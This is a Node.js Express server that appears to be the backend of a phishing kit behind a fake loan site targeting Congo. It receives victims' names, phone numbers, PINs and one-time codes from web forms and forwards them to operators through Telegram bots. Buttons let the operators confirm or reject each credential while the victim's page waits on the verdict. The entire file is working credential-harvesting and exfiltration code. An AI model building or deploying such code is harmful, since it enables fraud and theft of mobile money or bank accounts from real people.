require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_URL || 'https://click-loans-congo-x50d.onrender.com';

// ---------------- PERSISTENT STORES ----------------
const DATA_FILE = path.join(__dirname, 'data.json');

let approvedPins = {};
let approvedCodes = {};
let blockPins = {};
let requestBotMap = {};

try {
    if (fs.existsSync(DATA_FILE)) {
        const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        approvedPins   = saved.approvedPins   || {};
        approvedCodes  = saved.approvedCodes  || {};
        blockPins      = saved.blockPins      || {};
        requestBotMap  = saved.requestBotMap  || {};
        console.log('💾 Données restaurées depuis data.json');
    }
} catch (e) {
    console.error('❌ Échec chargement data.json:', e.message);
}

function persist() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            approvedPins, approvedCodes, blockPins, requestBotMap
        }));
    } catch (e) {
        console.error('❌ Persist failed:', e.message);
    }
}

// Double-click protection
const processedCallbacks = new Set();

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots chargés:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            parse_mode: 'Markdown',
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Erreur Telegram:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId, text = '') {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard = null) {
    try {
        const payload = {
            chat_id: chatId,
            message_id: messageId,
            text,
            parse_mode: 'Markdown'
        };
        // null / vide = supprime les boutons
        payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };

        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/editMessageText`,
            payload
        );
    } catch (err) {
        const desc = err.response?.data?.description || err.message;
        if (!desc.includes('message is not modified')) {
            console.error('editMessageText error:', desc);
        }
    }
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot, retries = 5) {
    const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
    for (let i = 0; i < retries; i++) {
        try {
            const { data } = await axios.get(
                `https://api.telegram.org/bot${bot.botToken}/setWebhook`,
                { params: { url: webhookUrl, drop_pending_updates: false } }
            );
            if (data.ok) {
                console.log(`✅ Webhook configuré pour ${bot.botId}: ${webhookUrl}`);
                return;
            }
            throw new Error(JSON.stringify(data));
        } catch (err) {
            console.error(`❌ Webhook tentative ${i + 1} échouée pour ${bot.botId}:`,
                err.response?.data || err.message);
            await new Promise(r => setTimeout(r, 3000));
        }
    }
}

async function setAllWebhooks() {
    for (const bot of bots) await setWebhook(bot);
}

// ---------------- PAGES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Lien bot invalide');
    res.redirect(`/index.html?botId=${bot.botId}`);
});
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- HEALTH / KEEP-ALIVE ENDPOINT ----------------
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        bots: bots.map(b => b.botId)
    });
});

// ---------------- PIN SUBMISSION ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Bot invalide' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;
    persist();

    sendTelegramMessage(bot, `🔐 VÉRIFICATION DU CODE PIN\n\nNom: ${name}\nTéléphone: ${phone}\nPIN: ${pin}`, [[
        { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
        { text: '❌ PIN incorrect', callback_data: `pin_bad:${requestId}` },
        { text: '🛑 Bloquer', callback_data: `pin_block:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'Utilisateur bloqué' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- CODE SUBMISSION ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Bot invalide' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;
    persist();

    sendTelegramMessage(bot, `🔑 VÉRIFICATION DU CODE\n\nNom: ${name}\nTéléphone: ${phone}\nCode: ${code}`, [[
        { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
        { text: '❌ Code incorrect', callback_data: `code_bad:${requestId}` },
        { text: '✅ Code OK + ❌ PIN incorrect', callback_data: `code_pin:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    // Protection double-clic
    if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
    processedCallbacks.add(cb.id);
    setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);

    const [action, requestId] = (cb.data || '').split(':');
    const messageId = cb.message?.message_id;
    const chatId    = cb.message?.chat?.id;
    let feedback = '';
    let statusLine = '';

    if (action === 'pin_ok') {
        approvedPins[requestId] = true;
        persist();
        feedback = 'PIN approuvé ✅';
        statusLine = '\n\n_✅ Approuvé par admin_';
    } else if (action === 'pin_bad') {
        approvedPins[requestId] = false;
        persist();
        feedback = 'PIN rejeté ❌';
        statusLine = '\n\n_❌ Rejeté par admin_';
    } else if (action === 'pin_block') {
        blockPins[requestId] = true;
        persist();
        feedback = 'Utilisateur bloqué 🛑';
        statusLine = '\n\n_🛑 Utilisateur bloqué_';
    } else if (action === 'code_ok') {
        approvedCodes[requestId] = true;
        persist();
        feedback = 'Code approuvé ✅';
        statusLine = '\n\n_✅ Approuvé par admin_';
    } else if (action === 'code_bad') {
        approvedCodes[requestId] = false;
        persist();
        feedback = 'Code rejeté ❌';
        statusLine = '\n\n_❌ Rejeté par admin_';
    } else if (action === 'code_pin') {
        approvedCodes[requestId] = true;
        approvedPins[requestId]  = false;
        persist();
        feedback = 'Code approuvé – ressaisir le PIN';
        statusLine = '\n\n_✅ Code OK — ⚠️ PIN à ressaisir_';
    } else {
        statusLine = '\n\n_⚠️ Action inconnue_';
    }

    // 🔥 Édite le message original : ajoute le statut + SUPPRIME les boutons
    if (messageId && chatId && statusLine) {
        const originalText = cb.message.text || '';
        await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
    }

    if (feedback) await sendTelegramMessage(bot, `📝 Retour:\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// =====================================================
//          KEEP-ALIVE (ANTI-SLEEP) SYSTEM
// =====================================================
// ⚠️ IMPORTANT : un serveur endormi NE PEUT PAS se réveiller lui-même.
// Ce self-ping ne fonctionne QUE tant que le process tourne.
// Utilisez AUSSI un pinger externe (cron-job.org / UptimeRobot) sur /health.

const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000; // 10 minutes
let keepAliveTimer = null;

async function selfPing() {
    try {
        const url = `${DOMAIN}/health`;
        const res = await axios.get(url, { timeout: 20000 });
        console.log(`💓 Keep-alive OK (${res.status}) → ${url} @ ${new Date().toISOString()}`);
    } catch (err) {
        console.warn(`⚠️ Keep-alive failed: ${err.response?.status || err.message}`);
        setTimeout(() => {
            axios.get(`${DOMAIN}/health`, { timeout: 20000 })
                .then(r => console.log(`💓 Keep-alive retry OK (${r.status})`))
                .catch(e => console.warn(`⚠️ Keep-alive retry failed: ${e.message}`));
        }, 30 * 1000);
    }
}

function startKeepAlive() {
    if (keepAliveTimer) clearInterval(keepAliveTimer);
    setTimeout(selfPing, 15 * 1000);
    keepAliveTimer = setInterval(selfPing, KEEPALIVE_INTERVAL_MS);
    console.log('🩺 Keep-alive démarré (ping toutes les 10 min)');
}

// =====================================================
//      GLOBAL CRASH GUARDS (auto-recover process)
// =====================================================
process.on('uncaughtException', (err) => {
    console.error('💥 uncaughtException:', err);
});

process.on('unhandledRejection', (reason) => {
    console.error('💥 unhandledRejection:', reason);
});

process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM reçu, arrêt propre...');
    if (keepAliveTimer) clearInterval(keepAliveTimer);
    process.exit(0);
});

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
    app.listen(PORT, () => {
        console.log(`🚀 Serveur démarré sur le port ${PORT}`);
        startKeepAlive();
    });
});